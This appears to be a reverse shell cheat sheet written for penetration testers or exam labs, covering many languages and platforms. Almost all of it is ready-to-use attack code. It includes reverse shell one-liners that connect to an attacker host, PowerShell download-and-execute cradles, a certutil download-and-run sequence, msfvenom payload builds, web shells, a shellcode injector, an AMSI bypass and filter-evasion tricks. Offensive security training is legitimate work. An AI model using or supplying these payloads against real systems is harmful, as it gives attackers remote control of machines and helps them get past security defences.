# Reverse Shell Cheat Sheet

Replace `<IP>` with your attacker IP and `<PORT>` with your listener port throughout. The convention used here is `10.10.14.5` and `4444` in examples.

## Listeners First

**Always start the listener BEFORE triggering the payload.**

```bash
# Plain netcat
nc -lvnp 4444
ncat -lvnp 4444

# With command-line history (much better)
rlwrap nc -lvnp 4444

# pwncat-cs (auto-stabilises shells, uploads/downloads, persistence helpers)
pwncat-cs -lp 4444

# socat for full PTY listener
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Metasploit multi/handler
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; run"
```

---

## Bash

### Standard (most reliable)

```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

### As one-liner with bash -c

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
```

### URL-encoded (for command injection through URL parameters)

```
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F4444%200%3E%261%27
```

### Double URL-encoded

```
bash%2520-c%2520%2527bash%2520-i%2520%253E%2526%2520%252Fdev%252Ftcp%252F10.10.14.5%252F4444%2520%253E%2526%25201%2527
```

### Base64 (avoids shell metacharacter issues)

```bash
echo "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" | base64 -w0
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQo=

# Then deliver:
bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}'
```

### Alternative file descriptors

```bash
exec 5<>/dev/tcp/10.10.14.5/4444
cat <&5 | while read line; do $line 2>&5 >&5; done

# Or
0<&196;exec 196<>/dev/tcp/10.10.14.5/4444; sh <&196 >&196 2>&196
```

### POSIX sh (when bash not available)

```sh
sh -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

### Without bash, dash, or sh recognising /dev/tcp

```bash
# /dev/tcp is bash-specific; alternatives if bash not available:
exec 3<>/dev/tcp/10.10.14.5/4444; cat <&3 | sh 2>&3 >&3
```

---

## Netcat

### Traditional nc with -e

```bash
nc -e /bin/bash 10.10.14.5 4444
nc -e /bin/sh 10.10.14.5 4444
```

### nc without -e (most modern Linux blocks -e)

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f
```

### OpenBSD nc (alternative form)

```bash
mkfifo /tmp/f; nc 10.10.14.5 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1
```

### nc.traditional (Debian/Ubuntu)

```bash
nc.traditional -e /bin/bash 10.10.14.5 4444
```

### ncat (with --ssl for encrypted)

```bash
ncat 10.10.14.5 4444 -e /bin/bash
ncat --ssl 10.10.14.5 4444 -e /bin/bash
```

---

## Python

### Python 3 (preferred)

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.5",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```

### Python 2

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Python with pty and TTY size detection

```python
import os,pty,socket,subprocess,sys,struct,fcntl,termios

s = socket.socket()
s.connect(("10.10.14.5", 4444))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# Detect TTY size from environment
fcntl.ioctl(0, termios.TIOCSWINSZ, struct.pack('hhhh', 40, 120, 0, 0))

pty.spawn("/bin/bash")
```

### Python (multi-line, when one-liner mangled)

```python
import socket,subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.14.5", 4444))
while True:
    cmd = s.recv(1024).decode()
    if not cmd or cmd.strip() == 'exit':
        break
    out = subprocess.run(cmd, shell=True, capture_output=True)
    s.send(out.stdout + out.stderr)
s.close()
```

---

## PHP

### Standard

```php
php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### With shell_exec

```php
php -r '$sock=fsockopen("10.10.14.5",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Alternative

```php
php -r '$sock=fsockopen("10.10.14.5",4444);system("/bin/sh -i <&3 >&3 2>&3");'
```

### As a web shell file (shell.php)

```php
<?php $sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

### PHP with proc_open (when fsockopen disabled)

```php
<?php
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);
$proc = proc_open('/bin/sh', $descriptorspec, $pipes);
$socket = stream_socket_client("tcp://10.10.14.5:4444");
while ($cmd = fgets($socket)) {
    fwrite($pipes[0], $cmd);
    fflush($pipes[0]);
    echo stream_get_contents($pipes[1]);
}
?>
```

### PHP one-liner cmd via popen

```php
<?php popen("nc 10.10.14.5 4444 -e /bin/sh", "r"); ?>
```

### Backup PHP web shell (not reverse - simpler diagnostic)

```php
<?php system($_GET['c']); ?>
<?php echo shell_exec($_GET['c']); ?>
<?php passthru($_GET['c']); ?>
<?php eval($_POST['c']); ?>
```

---

## Perl

### Standard

```perl
perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Without /bin/sh (POSIX exec failsafe)

```perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.14.5:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

---

## Ruby

```ruby
ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.5",4444))'
```

### Alternative

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.10.14.5",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Without TCPSocket (using io)

```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.14.5","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

---

## Node.js / JavaScript

```javascript
require('child_process').exec('bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"')
```

### Direct net connection

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4444, "10.10.14.5", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

---

## Java

```java
String host="10.10.14.5";
int port=4444;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();po.flush();Thread.sleep(50);
  try{p.exitValue();break;}catch (Exception e){}
};
p.destroy();s.close();
```

### Compact Java rev shell

```java
Runtime r = Runtime.getRuntime();
Process p = r.exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.5/4444;cat <&5 | while read line; do $line 2>&5 >&5; done"});
p.waitFor();
```

### As JSP file

```jsp
<%@ page import="java.lang.*, java.util.*, java.io.*, java.net.*" %>
<%
class StreamConnector extends Thread {
    InputStream is;
    OutputStream os;
    StreamConnector(InputStream is, OutputStream os) { this.is = is; this.os = os; }
    public void run() {
        try {
            int b;
            while ((b = is.read()) != -1) os.write(b);
        } catch (Exception e) {}
    }
}
String host = "10.10.14.5";
int port = 4444;
Socket socket = new Socket(host, port);
Process process = Runtime.getRuntime().exec("/bin/bash");
(new StreamConnector(process.getInputStream(), socket.getOutputStream())).start();
(new StreamConnector(socket.getInputStream(), process.getOutputStream())).start();
%>
```

---

## PowerShell

### Standard one-liner

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Base64-encoded (for cleaner injection through cmd, web, etc.)

To create the encoded version:

```bash
# In Linux:
PAYLOAD='$client = New-Object System.Net.Sockets.TCPClient("10.10.14.5",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

# UTF-16-LE encode (PowerShell expects this)
echo -n "$PAYLOAD" | iconv -t utf-16le | base64 -w0

# Then deliver:
powershell -EncodedCommand <BASE64>
```

### Nishang Invoke-PowerShellTcp

```powershell
# Requires Nishang to be available locally
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.5 -Port 4444

# Common variant - download and execute in memory
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.5 -Port 4444"
```

### PowerShell over HTTPS (pwncat compatible)

```powershell
$T='[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")] public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
$w = Add-Type -memberDefinition $T -Name "Win32" -namespace Win32Functions -passthru;
[Byte[]]$shellcode = (msfvenom_payload_bytes_here);
$size = $shellcode.Length;
$x=$w::VirtualAlloc(0,$size+1,0x3000,0x40);
for ($i=0;$i -le ($size-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $shellcode[$i], 1) | Out-Null};
$w::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

### PowerShell that bypasses ExecutionPolicy

```powershell
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -nop -w hidden -c "IEX(...)"
powershell -nop -ep bypass -enc <base64>
```

### PowerShell AMSI bypass (then execute payload)

```powershell
$a=[Ref].Assembly.GetTypes();
foreach ($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};
$d=$c.GetFields('NonPublic,Static');
foreach ($e in $d) {if ($e.Name -like "*Context") {$f=$e}};
$g=$f.GetValue($null);
[IntPtr]$ptr=$g;
[Int32[]]$buf = @(0);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

---

## Windows

### certutil download + execute (no PowerShell needed)

```cmd
certutil -urlcache -split -f http://10.10.14.5/nc.exe C:\Windows\Temp\nc.exe
C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.5 4444
```

### Windows ncat reverse shell

```cmd
ncat 10.10.14.5 4444 -e cmd.exe
```

### MSFVenom payloads to compile/use

```bash
# Windows reverse shell exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe

# Windows reverse meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o met.exe

# As DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o evil.dll

# As MSI (for AlwaysInstallElevated)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o evil.msi

# As service exe (replace a Windows service)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe-service -o svc.exe

# PowerShell-encoded
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f psh -o shell.ps1
```

---

## Web Shells (file-based, not reverse)

### PHP

```php
<?php system($_GET['c']); ?>
<?php echo shell_exec($_GET['c']); ?>
<?php passthru($_GET['c']); ?>
<?php eval($_GET['c']); ?>
<?php echo `${$_GET['c']}`; ?>
<?php $a=$_GET['c']; $a(); ?>      # call as function
```

### ASP

```asp
<%@ Language=VBScript %>
<% Response.Write CreateObject("WScript.Shell").Exec("cmd /c " & Request.QueryString("c")).StdOut.ReadAll() %>
```

### ASPX

```aspx
<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
ProcessStartInfo psi = new ProcessStartInfo("cmd", "/c " + Request["c"]);
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
Response.Write(p.StandardOutput.ReadToEnd());
p.WaitForExit();
%>
```

### JSP

```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("c");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line);
    }
}
%>
```

### JSP via WAR file (Tomcat)

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war > shell.war
# Upload to /manager/text/deploy?path=/shell
# Trigger: http://target/shell/
```

### Perl CGI

```perl
#!/usr/bin/perl
print "Content-Type: text/html\n\n";
$c = $ENV{'QUERY_STRING'};
$c =~ s/c=//;
print `$c`;
```

---

## Shell Stabilisation (after catching basic shell)

### Linux: Method 1 - python pty

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# (or python -c, or just type python and look for which is present)

# Background (Ctrl+Z)
^Z

# Configure local terminal
stty raw -echo; fg
# Press Enter, Enter

# Set environment
export TERM=xterm-256color
export SHELL=bash

# Match terminal size to your local terminal
# In a SEPARATE local terminal, get size:
stty size
# Returns e.g. "40 174"

# In the rev shell:
stty rows 40 cols 174
```

### Linux: Method 2 - script (cleaner)

```bash
script -qc /bin/bash /dev/null
# Then ^Z, stty raw -echo; fg, etc.
```

### Linux: Method 3 - socat (full PTY from start)

```bash
# On listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

# In victim (re-fire payload via socat):
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444

# This gives full PTY immediately - no stabilisation needed
```

### Linux: Method 4 - upgrade existing shell to socat

If you already have a basic shell and socat is available on the victim:

```bash
# On listener:
socat file:`tty`,raw,echo=0 tcp-listen:4445

# In existing shell:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4445
```

### Windows: limited stabilisation

Windows shells from cmd.exe don't have a true pty equivalent. The closest:

```bash
# Use ConPtyShell (Powershell, gives a near-full pty)
# 1. Listener:
stty raw -echo; (stty size; cat) | nc -lvnp 4444

# 2. Victim:
IEX(IWR http://10.10.14.5/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.5 4444
```

### Tab completion in unstabilised shell

Without stabilisation, you can still tab-complete inside ranges of commands:

```bash
# Run TabComplete in background
echo "TAB_COMP" > /tmp/tab
ls /usr/bin/ | grep "^${PARTIAL}"     # manually grep
```

---

## Reverse Shell over Unusual Channels

### ICMP rev shell

```bash
# Attacker (icmp-listener python)
python3 icmp_listener.py

# Victim (icmp-shell.py)
sudo python3 icmp_shell.py 10.10.14.5
```

### DNS rev shell

```bash
# Tools: dnscat2 (server + client)
# Attacker:
ruby dnscat2.rb shell.attacker.com

# Victim:
./dnscat shell.attacker.com
```

### HTTP/HTTPS rev shell

```bash
# Standard web-based command-and-control
# Tools: Merlin, Sliver, Empire, Mythic
# Generally exam-overkill but available
```

---

## Encoding Tricks for Difficult Channels

### Avoid spaces (where ${IFS} isn't available)

```bash
# Use brace expansion
{cat,/etc/passwd}
{ls,-la}

# Or HereString-like
cat</etc/passwd
```

### Avoid common keywords (cat, sh, bash)

```bash
# Use alternates
tac /etc/passwd                 # reverse cat
head -100 /etc/passwd
tail -100 /etc/passwd
nl /etc/passwd
od -c /etc/passwd | head

# Variable construction
b="bash";$b -c 'whoami'
$0 -c 'whoami'                  # $0 is the current shell name

# Concatenation
a="ba";b="sh";$a$b -c "id"
```

### Avoid `/`

```bash
# Use shell variables containing /
${HOME}/                        # /home/user/
${PWD}                          # current dir
${PATH%%:*}                     # /usr/local/sbin (or first PATH element)

# Or evaluate
$(echo /etc/passwd)
$(printf /etc/passwd)
```

### Non-alphanumeric only (the JSF*ck-style horror)

Possible but rarely needed in practice. If you encounter it, refer to PayloadsAllTheThings full repo.

---

## Quick Listener Cheat: socat for Full PTY

```bash
# This is the cleanest stabilisation if both ends have socat:

# Attacker:
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444

# Result: full PTY shell immediately, with working tab completion, history, ^C handling, etc.
```

This is the option to reach for when you have a brief command execution window and the target has socat - skip the stabilisation dance entirely.
